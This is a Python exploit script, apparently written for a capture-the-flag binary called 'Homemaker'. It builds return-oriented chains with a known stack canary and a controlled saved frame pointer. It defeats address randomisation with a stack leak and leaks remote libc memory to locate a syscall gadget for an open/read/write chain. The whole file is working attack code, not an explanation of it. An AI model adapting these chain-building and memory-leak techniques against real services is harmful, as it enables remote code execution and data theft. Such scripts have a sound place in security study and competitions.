#!/usr/bin/env python
"""Homemaker: recover a raw `syscall` instruction from the remote libc.

Everything else the open/read/write chain needs already exists in the binary:
read@plt and write@plt load their own syscall number, and read_frame's epilogue
(base+0x1662: `mov rdx,[rbp-0x8]; sub rdx,fs:0x28; ...; leave; ret`) zeroes rdx while
leaving rax alone -- and the pivot target is [rbp+8] with rbp taken from the saved rbp
we control, so it is a reusable gadget.

The one missing piece is an `0f 05` in libc. 0x1810(ctx) emits `[ctx+0x100]` bytes from
ctx, so a probe only answers when those two bytes hold <= 0x7F8 (alignment padding and
zero displements make that common in practice). Each probe is preceded by a marker read
served out of our own card, so every returned blob carries its own absolute ctx and a hit
converts straight into an absolute gadget address -- no build identification needed.

ASLR is redrawn per connection, so the libc anchor comes from the same connection's stack
dump: mem[0x298] - write was identical on three separate connections.
"""
import json
import struct
import sys

import hmlib as H

MK_DATA, MK_GATE = 0x500, 0x600          # marker bytes / their length gate, inside the card
PAIR = 48                                # (pop rdi, ctx, arg, call) x2 per probe
ANCHOR, ANCHOR_DELTA = 0x298, 0x11E790   # mem[0x298] - write, stable across connections


def read_gadget(base, ctx):
    return H.p64(base + H.POP_RDI) + H.p64(ctx) + H.p64(base + H.READFN)


def n_probes():
    return (MK_DATA - 0x118) // PAIR


def card_with_probes(s, ctxs):
    """Card whose chain alternates marker, probe, marker, probe, ..."""
    chain = bytearray()
    for i in range(len(ctxs)):
        chain += read_gadget(s.base, s.mema + MK_DATA + 8 * i)
        chain += read_gadget(s.base, ctxs[i])
    d = bytearray(H.build_card(s.mema, s.canary, s.saved_rbp, bytes(chain)))
    for i in range(len(ctxs)):
        d[MK_DATA + 8 * i:MK_DATA + 8 * i + 8] = b"HMCARD!" + struct.pack("<B", i)
        d[MK_GATE + 8 * i:MK_GATE + 8 * i + 2] = struct.pack("<H", 8)
    return bytes(d)


def scan(W, lo, hi, save=True):
    n = n_probes()
    step = max((hi - lo) // n, 1)
    ctxs = [W + lo + i * step for i in range(n)]
    for attempt in range(3):
        try:
            s, mem = H.setup()
            break
        except Exception as e:
            print("[!] setup failed (%s), retrying" % e)
    else:
        return []
    w = struct.unpack("<Q", mem[ANCHOR:ANCHOR + 8])[0] - ANCHOR_DELTA
    ctxs = [w + lo + i * step for i in range(n)]
    print("[*] this conn: write=%#x  probing [%+#x,%+#x) step %#x, %d probes"
          % (w, lo, lo + n * step, step, n))
    out = s.big_card_and_run(card_with_probes(s, ctxs), drain=12.0)
    hits, cur, markers = [], None, 0
    for body, ok in out:
        if not body:
            continue
        data = body[1:]
        if len(data) == 8 and data.startswith(b"HMCARD!"):
            cur = data[7]
            markers += 1
            continue
        hits.append((cur, None if cur is None else ctxs[cur], data))
        print("    probe %-4s ctx=%s len=%-5d %r"
              % (cur, "--" if cur is None else "%#x" % ctxs[cur], len(data), data[:40]))
    print("[*] %d/%d markers returned, %d data hits, %d bytes"
          % (markers, n, len(hits), sum(len(h[2]) for h in hits)))
    s.s.close()
    if save:
        with open("analysis/libcscan.jsonl", "a") as f:
            for cur, ctx, data in hits:
                f.write(json.dumps({"W": w, "lo": lo, "step": step, "probe": cur,
                                    "ctx": ctx, "hex": data.hex()}) + "\n")
    return hits


if __name__ == "__main__":
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else -0x1200
    span = int(sys.argv[2], 0) if len(sys.argv) > 2 else 0x2400
    reps = int(sys.argv[3]) if len(sys.argv) > 3 else 2
    for r in range(reps):
        scan(0, base + r * span, base + (r + 1) * span)
